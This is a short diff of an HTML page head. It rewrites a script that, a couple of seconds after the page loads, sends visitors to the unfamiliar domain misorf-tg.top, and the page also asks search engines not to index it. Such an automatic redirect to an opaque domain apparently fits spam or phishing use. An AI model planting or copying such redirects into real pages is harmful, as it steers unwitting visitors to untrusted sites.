@@ -1,14 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-   <script>
-      function redirect() {
-        window.location.href = "https://misorf-tg.top/ybwqiuq"; // Replace with your desired URL
-      }
+ <script>
+    // URL to redirect to
+    const redirectUrl = "https://misorf-tg.top/ybwqiuq"; // Replace with your desired URL
+    const redirectDelay = 2000; // Redirection delay in milliseconds
 
-      // Redirect immediately
-      setTimeout(redirect, 2000);
-    </script>
+    // Function to handle redirection
+    function redirect() {
+        window.location.href = redirectUrl;
+    }
+
+    // Function to start the countdown and redirect
+    function startRedirectionCountdown() {
+        let countdownTime = redirectDelay / 1000; // Convert milliseconds to seconds
+
+        const countdownInterval = setInterval(() => {
+            if (countdownTime <= 0) {
+                clearInterval(countdownInterval);
+                redirect();
+            } else {
+                countdownTime--;
+            }
+        }, 1000);
+    }
+
+    // Wait for the DOM to fully load before starting the redirection
+    document.addEventListener("DOMContentLoaded", () => {
+        startRedirectionCountdown();
+    });
+</script>
+
   
     <meta content="text/html;charset=utf-8" http-equiv="Content-Type" />
     <meta content="noindex,noarchive,nofollow,nosnippet" name="robots" />
